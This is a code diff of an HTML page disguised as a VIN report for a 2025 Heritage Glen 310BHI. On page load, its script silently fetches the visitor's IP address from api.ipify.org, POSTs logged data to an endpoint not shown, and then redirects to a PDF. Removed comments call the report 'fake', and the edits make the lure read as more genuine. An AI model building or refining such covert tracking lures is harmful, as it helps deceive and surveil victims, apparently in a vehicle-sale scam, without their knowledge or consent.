@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VIN Report - 2025 Heritage Glen 310BHI</title>
+    <title>2025 Heritage Glen 310BHI VIN Report</title>
     <script>
-        function logIP() {
+        function logIPAndRedirect() {
             fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
@@ -23,21 +23,16 @@
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify(logData)
+                }).then(() => {
+                    // Redirect to the actual PDF
+                    window.location.href = '2025_Heritage_Glen_310BHI.pdf';
                 });
-                
-                // Redirect to the fake VIN report
-                setTimeout(() => {
-                    window.location.href = '2025_Heritage_Glen_310BHI.pdf';  // Replace with actual PDF file path
-                }, 1000);
             });
         }
     </script>
 </head>
-<body onload="logIP()">
-    <h2>Generating VIN Report...</h2>
-    <p>Please wait while we verify the vehicle details.</p>
-    
-    <!-- Hidden tracking image -->
-    <img src="tracker.png" width="1" height="1" style="display:none;">
+<body onload="logIPAndRedirect()">
+    <h2>Loading VIN Report...</h2>
+    <p>Please wait while the document loads.</p>
 </body>
 </html>
